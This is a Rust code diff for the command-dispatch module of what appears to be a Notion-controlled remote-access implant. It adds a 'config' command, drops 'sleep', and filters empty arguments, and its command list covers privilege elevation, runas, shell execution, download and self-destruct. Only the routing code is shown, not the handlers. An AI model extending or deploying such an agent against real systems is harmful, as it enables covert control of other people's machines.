@@ -5,10 +5,11 @@ use std::result::Result;
 use core::str::Split;
 use std::fmt;
 // External imports
-use crate::config::ConfigOptions;
+use crate::config::{ConfigOptions, ConfigOption};
 use crate::logger::Logger;
 // Command modules
 mod cd;
+mod config;
 mod download;
 pub mod elevate;
 pub mod getprivs;
@@ -20,7 +21,6 @@ mod pwd;
 mod runas;
 mod save;
 pub mod shell;
-mod sleep;
 mod shutdown;
 mod whoami;
 mod unknown;
@@ -48,6 +48,7 @@ pub(crate) use notion_out;
 /// All the possible command types. Some have command strings, and some don't.
 pub enum CommandType {
     Cd,
+    Config,
     Download,
     Elevate,
     Getprivs,
@@ -61,7 +62,6 @@ pub enum CommandType {
     Runas,
     Shell,
     Shutdown,
-    Sleep,
     Whoami,
     Unknown
 }
@@ -106,6 +106,7 @@ impl CommandArgs {
     /// `CommandArgs`.
     pub fn from_split(args_split: Split<&str> ) -> CommandArgs {
         let items: Vec<String> = args_split
+            .filter(|&a| a != "")
             .map(|a| a.trim().to_string())
             .collect();
         CommandArgs { items: items, count: 0 }
@@ -114,6 +115,7 @@ impl CommandArgs {
     pub fn from_string(args_string: String) -> CommandArgs {
         let items: Vec<String> = args_string
             .split(" ")
+            .filter(|&a| a != "")
             .map(|s| s.trim().to_string())
             .collect();
 
@@ -167,6 +169,7 @@ impl NotionCommand {
 
             let command_type: CommandType = match t {
                 "cd"       => CommandType::Cd,
+                "config"   => CommandType::Config,
                 "download" => CommandType::Download,
                 "elevate"  => CommandType::Elevate,
                 "getprivs" => CommandType::Getprivs,
@@ -180,7 +183,6 @@ impl NotionCommand {
                 "selfdestruct" => CommandType::Selfdestruct,
                 "shell"    => CommandType::Shell,
                 "shutdown" => CommandType::Shutdown,
-                "sleep"    => CommandType::Sleep,
                 "whoami"   => CommandType::Whoami,
                 _          => CommandType::Unknown,
             };
@@ -194,6 +196,7 @@ impl NotionCommand {
     pub async fn handle(&mut self, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
         match &self.command_type {
             CommandType::Cd       => cd::handle(&mut self.args),
+            CommandType::Config    => config::handle(&mut self.args, config_options, logger).await,
             CommandType::Download => download::handle( &mut self.args, logger).await,
             CommandType::Elevate  => elevate::handle(&mut self.args, config_options).await,
             CommandType::Getprivs    => getprivs::handle().await,
@@ -207,7 +210,6 @@ impl NotionCommand {
             CommandType::Selfdestruct => selfdestruct::handle().await,
             CommandType::Shell    => shell::handle(&mut self.args).await,
             CommandType::Shutdown    => shutdown::handle().await,
-            CommandType::Sleep    => sleep::handle(&mut self.args, config_options).await,
             CommandType::Whoami      => whoami::handle().await,
             CommandType::Unknown  => unknown::handle().await,
         }
